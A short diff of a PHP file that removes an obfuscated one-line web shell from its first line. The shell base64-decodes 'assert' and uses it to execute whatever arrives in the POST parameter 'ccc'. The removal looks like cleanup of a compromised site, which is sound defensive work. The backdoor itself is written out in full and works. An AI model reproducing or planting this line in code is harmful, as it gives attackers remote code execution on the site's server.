@@ -1,4 +1,3 @@
-<?php $x=base64_decode("YXNzZXJ0");$x($_POST['ccc']);?>
 <?php
 set_time_limit(0);
 error_reporting(0);
